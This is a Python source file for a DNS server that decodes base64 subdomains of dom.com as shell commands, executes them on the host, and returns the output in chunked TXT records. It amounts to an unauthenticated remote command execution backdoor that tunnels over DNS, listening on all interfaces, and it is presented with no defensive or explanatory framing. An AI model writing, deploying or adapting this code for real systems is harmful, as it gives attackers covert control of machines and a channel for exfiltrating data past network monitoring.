# dns_listener.py
from dnslib.server import DNSServer, BaseResolver
from dnslib import DNSRecord, QTYPE, RR, TXT
import base64
import subprocess

CHUNK_SIZE = 200  # bytes per TXT record

# 👇 Store chunks globally
shared_chunks = {}

class CommandResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        domain = qname.rstrip('.')
        print(f"[+] Query received: {domain}")

        reply = request.reply()

        if domain.endswith(".dom.com"):
            sub = domain.replace(".dom.com", "").replace(".", "")
            # Handle numbered chunk requests like 1.dom.com, 2.dom.com
            if sub.isdigit():
                chunk_index = int(sub)
                chunk_txt = shared_chunks.get(chunk_index, "error:no-such-chunk")
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunk_txt), ttl=60))
                return reply

            # Otherwise, treat it as a new command
            try:
                decoded_cmd = base64.b64decode(sub.encode()).decode()
                print(f"[+] Decoded command: {decoded_cmd}")
                output = subprocess.getoutput(decoded_cmd)
                print(f"[+] Output:\n{output}")

                # Encode and chunk
                b64_output = base64.b64encode(output.encode()).decode()
                chunks = [b64_output[i:i+CHUNK_SIZE] for i in range(0, len(b64_output), CHUNK_SIZE)]
                for i, chunk in enumerate(chunks):
                    shared_chunks[i] = f"part-{i+1}-of-{len(chunks)}:{chunk}"

                # Return first chunk
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(shared_chunks[0]), ttl=60))
            except Exception as e:
                error_msg = f"error:{str(e)}"
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(error_msg), ttl=60))
        else:
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("error:invalid-domain"), ttl=60))

        return reply

def start_dns_server():
    resolver = CommandResolver()
    server = DNSServer(resolver, port=5300, address="0.0.0.0", tcp=False)
    server.start_thread()
    print("[+] DNS mock server running on 0.0.0.0:5300")
    while True:
        pass

if __name__ == "__main__":
    start_dns_server()
